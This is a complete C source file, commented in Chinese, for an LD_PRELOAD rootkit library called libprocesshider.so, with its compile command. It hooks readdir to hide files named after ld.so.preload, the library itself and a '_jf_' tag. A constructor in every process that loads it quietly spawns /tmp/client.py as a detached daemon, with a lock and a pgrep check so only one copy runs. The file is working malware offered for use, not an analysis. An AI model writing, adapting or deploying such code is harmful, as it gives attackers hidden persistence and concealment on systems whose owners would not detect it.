/* =============================================================
 *  libprocesshider.so
 *  通过 LD_PRELOAD 注入到每个进程,劫持 readdir,
 *  隐藏 ld.so.preload、libprocesshider.so 等敏感关键字。
 *  编译: gcc -shared -fPIC -nostartfiles -o libprocesshider.so preload.c -ldl
 * ============================================================= */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/file.h>
#include <sys/types.h>
#include <sys/wait.h>

/* 关键:第一次调用 readdir 之前完成 dlsym 解析 */
typedef struct dirent *(*readdir_t)(DIR *);
static readdir_t orig_readdir = NULL;

/* 要隐藏的关键字,出现即过滤 */
static const char *hide_keywords[] = {
    "ld.so.preload",
    "libprocesshider",
    "_jf_",
    NULL,
};

/* 前置声明:_init() 里要调,定义放在文件末尾 */
static void ensure_client_py(void);

__attribute__((constructor))
static void _init(void) {
    orig_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
    if (!orig_readdir) {
        /* 失败也别崩,直接返回 NULL,目标进程最多 ls 失败 */
        fprintf(stderr, "libprocesshider: dlsym(readdir) failed\n");
    }
    /* 顺便检查/拉起 client.py(forward decl 见下方) */
    ensure_client_py();
}

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) return NULL;

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        int hide = 0;
        for (int i = 0; hide_keywords[i]; ++i) {
            if (strstr(entry->d_name, hide_keywords[i])) {
                hide = 1;
                break;
            }
        }
        if (!hide) return entry;
    }
    return NULL;
}

/* -------------------------------------------------------------
 *  ensure_client_py()
 *  每次有新进程加载本 .so 时都会被调到。
 *  行为:
 *    1) flock 非阻塞互斥 -> 同时只一个进程真做事,避免刷屏
 *    2) access("/tmp/client.py", X_OK) -> 脚本不存在直接返回
 *    3) pgrep -f client.py -> 检查是否已有 client.py 在跑
 *    4) 没在跑就 fork + execlp("python3", "python3", "/tmp/client.py")
 *       子进程彻底脱离(setsid + 关闭/重定向标准 fd)
 *  防递归关键:
 *    我们 exec 出来的 python3 进程,其 argv 里含 "/tmp/client.py",
 *    所以 python3 自己再跑 ensure_client_py 时 pgrep 会匹配到自己,
 *    走 "已在跑" 分支直接返回,不会无限 spawn。
 * ------------------------------------------------------------- */
static void ensure_client_py(void) {
    /* 1) flock 互斥(close(fd) 自动放锁) */
    int lockfd = open("/tmp/.libprocesshider.lock", O_CREAT | O_RDWR, 0644);
    if (lockfd < 0) return;
    if (flock(lockfd, LOCK_EX | LOCK_NB) != 0) {
        /* 别的进程正在做事,直接走人 */
        close(lockfd);
        return;
    }

    /* 2) 脚本不存在就别折腾 */
    if (access("/tmp/client.py", X_OK) != 0) {
        close(lockfd);
        return;
    }

    /* 3) pgrep -f 走 cmdline 匹配;在跑就跳过 */
    FILE *fp = popen("pgrep -f client.py >/dev/null 2>&1", "r");
    int rc = fp ? pclose(fp) : -1;
    int found = (fp != NULL && WIFEXITED(rc) && WEXITSTATUS(rc) == 0);
    if (found) {
        close(lockfd);
        return;
    }

    /* 4) 没在跑,fork 一个彻底脱离的子进程 */
    pid_t pid = fork();
    if (pid < 0) {
        close(lockfd);
        return;
    }
    if (pid == 0) {
        /* 子进程:脱离会话、丢掉标准 fd */
        setsid();
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        int devnull = open("/dev/null", O_RDWR);
        if (devnull >= 0) {
            if (devnull != STDIN_FILENO)  dup2(devnull, STDIN_FILENO);
            if (devnull != STDOUT_FILENO) dup2(devnull, STDOUT_FILENO);
            if (devnull != STDERR_FILENO) dup2(devnull, STDERR_FILENO);
            if (devnull > STDERR_FILENO) close(devnull);
        }
        /* execlp 让 PATH 帮我们找 python3 */
        execlp("python3", "python3", "/tmp/client.py", (char *)NULL);
        _exit(127);
    }
    /* 父进程不等子进程:LD_PRELOAD constructor 里 waitpid 容易卡住 */

    close(lockfd);   /* 关闭 fd 即释放 flock */
}
